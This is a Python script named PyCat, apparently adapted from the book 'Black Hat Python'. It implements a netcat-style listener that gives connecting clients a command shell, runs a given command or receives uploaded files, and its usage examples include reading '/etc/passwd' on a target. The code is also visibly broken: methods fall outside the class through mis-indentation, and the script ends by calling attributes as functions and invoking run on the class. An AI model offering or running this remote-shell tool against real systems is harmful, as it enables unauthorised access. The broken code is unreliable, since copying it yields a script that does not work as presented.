"""
Written By: GenNiox
Last Modified: 15-MAR-2023

I am not responsible for any misuse of this program. This program is provided as-is with no warranty, guarantee, or
certainty of functionality. I am not responsible for any losses that may result from the use of this program/script.
This script was written for my own educational benefit and use. You are permitted to reuse, copy, and utilize my script.
This script was created with the help from the author of "Black Hat Python (2nd Edition)."

                         |
                         ^
Hack on, brothers!     \/G\/
                       / V \
"""


import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading


def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()


class PyCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

def run(self):
    if self.args.listen:
        self.listen()
    else:
        self.send()

def send(self):
    self.socket.connect((self.args.target, self.args.port))
    if self.buffer:
        self.socket.send(self.buffer)

        try:
            while True:
                recv_len = 1
                response = ""
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                    if response:
                        print(response)
                        buffer = input("> ")
                        buffer += "\n"
                        self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print("[~] User terminated session.")
            print("[+] Exiting..")
            self.socket.close()
            sys.exit()


def listen(self):
    self.socket.bind((self.args.target, self.args.port))
    self.socket.listen(5)
    while True:
        client_socket, _ = self.socket.accept()
        client_thread = threading.Thread(target=self.handle, args=(client_socket,))
        client_thread.start()


def handle(self, client_socket):
    if self.args.execute:
        output = execute(self.args.execute)
        client_socket.send(output.encode())
    elif self.args.upload:
        file_buffer = b""
        while True:
            data = client_socket.recv(4096)
            if data:
                file_buffer += data
            else:
                break
        with open(self.args.upload, "wb") as f:
            f.write(file_buffer)
        message = f"Saved file {self.args.upload}"
        client_socket.send(message.encode())

    elif self.args.command:
        cmd_buffer = b""
        while True:
            try:
                client_socket.send(b"PyCat: #> ")
                while "\n" not in cmd_buffer.decode():
                    cmd_buffer += client_socket.recv(64)
                response = execute(cmd_buffer.decode())
                if response:
                    client_socket.send(response.decode())
                cmd_buffer = b""
            except Exception as e:
                print(f"[-] Server killed: {e}")
                self.socket.close()
                sys.exit()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="PyCat -- a Python version of NetCat",formatter_class=argparse.RawDescriptionHelpFormatter,epilog=textwrap.dedent('''Example:
    PyCat.py -t 192.168.1.108 -p 5555 -l -c # Command Shell
    PyCat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt #Upload to file \"mytest.txt\"
    PyCat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # Execute command \"cat /etc/passwd\"
    echo 'ABC' | ./PyCat.py -t 192.168.1.108 -p 5555 # Echo text \"abc\" to target 192.168.1.108
    PyCat.py -t 192.168.1.108 -p 5555 # Connect to Server 192.168.1.108
    '''))
parser.add_argument("-c", "--command", dest="command", action="store_true", help="Execute Command, see --help for more info.")
parser.add_argument("-e", "--execute", dest="execute", help="Execute specified command. See --help for more info.")
parser.add_argument("-l", "--listen", dest="listen", action="store_true", help="Activate listener, see --help for more info.")
parser.add_argument("-p", "--port", dest="port", type=int, default=5555, help="Specify port, see --help for more info.")
parser.add_argument("-t", "--target", dest="target", default="192.168.1.108", help="Specify IP Address, see --help for more info.")
parser.add_argument("-u", "--upload", dest="upload", help="Upload file, see --help for more info.")
args = parser.parse_args()
if args.listen():
    buffer = ""
else:
    buffer = sys.stdin.read()


pc = PyCat(args, buffer.encode())
PyCat.run()

